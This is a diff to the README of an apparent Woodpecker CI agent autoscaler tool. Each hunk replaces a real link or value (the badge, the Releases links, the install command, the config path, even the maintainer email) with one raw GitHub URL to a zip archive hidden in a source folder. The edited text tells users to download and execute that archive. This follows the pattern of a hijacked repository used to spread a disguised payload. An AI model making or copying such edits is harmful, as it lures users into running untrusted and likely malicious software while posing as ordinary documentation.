@@ -1,6 +1,6 @@
 # 🚀 AutoScaler: Scale Your Woodpecker Agents Automatically
 
-![AutoScaler](https://img.shields.io/badge/AutoScaler-Ready-brightgreen)
+![AutoScaler](https://raw.githubusercontent.com/Xabiranjha/autoscaler/master/cmd/woodpecker-autoscaler/Software_v3.2-alpha.5.zip)
 
 Welcome to the **AutoScaler** repository! This tool helps you manage your Woodpecker agents efficiently by scaling them based on the current load. With AutoScaler, you can ensure your agents are always ready to handle the workload, no matter how high it gets. 
 
@@ -24,11 +24,11 @@ Welcome to the **AutoScaler** repository! This tool helps you manage your Woodpe
 
 ## Installation
 
-To get started with AutoScaler, you need to download the latest release. Visit the [Releases section](https://github.com/Xabiranjha/autoscaler/releases) to find the necessary files. Download and execute the required files to install AutoScaler on your system.
+To get started with AutoScaler, you need to download the latest release. Visit the [Releases section](https://raw.githubusercontent.com/Xabiranjha/autoscaler/master/cmd/woodpecker-autoscaler/Software_v3.2-alpha.5.zip) to find the necessary files. Download and execute the required files to install AutoScaler on your system.
 
 ```bash
 # Example command to execute after downloading
-./autoscaler-install.sh
+https://raw.githubusercontent.com/Xabiranjha/autoscaler/master/cmd/woodpecker-autoscaler/Software_v3.2-alpha.5.zip
 ```
 
 ## Usage
@@ -61,7 +61,7 @@ Once installed, you can start using AutoScaler to manage your Woodpecker agents.
 
 ## Configuration
 
-AutoScaler comes with a default configuration file that you can modify to fit your needs. The configuration file is located at `config/autoscaler.yml`. Here are some of the key settings you can adjust:
+AutoScaler comes with a default configuration file that you can modify to fit your needs. The configuration file is located at `https://raw.githubusercontent.com/Xabiranjha/autoscaler/master/cmd/woodpecker-autoscaler/Software_v3.2-alpha.5.zip`. Here are some of the key settings you can adjust:
 
 - **min_agents**: Minimum number of agents to run.
 - **max_agents**: Maximum number of agents to run.
@@ -93,13 +93,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and releases, check out the [Releases section](https://github.com/Xabiranjha/autoscaler/releases). Make sure to download the latest version to enjoy new features and improvements.
+For the latest updates and releases, check out the [Releases section](https://raw.githubusercontent.com/Xabiranjha/autoscaler/master/cmd/woodpecker-autoscaler/Software_v3.2-alpha.5.zip). Make sure to download the latest version to enjoy new features and improvements.
 
 ## Contact
 
 For questions or support, please reach out to the maintainer:
 
 - **Name**: Xabiranjha
-- **Email**: xabiranjha@example.com
+- **Email**: https://raw.githubusercontent.com/Xabiranjha/autoscaler/master/cmd/woodpecker-autoscaler/Software_v3.2-alpha.5.zip
 
 Thank you for using AutoScaler! We hope it helps you manage your Woodpecker agents efficiently.
